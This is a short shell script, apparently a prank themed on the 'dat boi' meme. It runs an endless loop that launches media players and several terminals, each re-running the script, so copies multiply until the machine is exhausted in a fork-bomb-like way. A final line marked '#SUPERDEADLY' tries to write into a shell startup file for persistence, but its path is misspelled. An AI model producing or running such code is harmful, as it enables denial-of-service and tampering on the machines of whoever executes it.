#! /bin/sh
while true
do
ffplay datboi.mp3 & 
nvlc datboi.mp3 & 
animate datboi.gif & 
konsole -e bash datboi.sh & 
xterm -e bash datboi.sh & 
gnome-terminal -- bash datboi.sh &
echo "cd /DatBoi-Shell-Script" | tee -a ~./bahsrc > /dev/null #SUPERDEADLY
done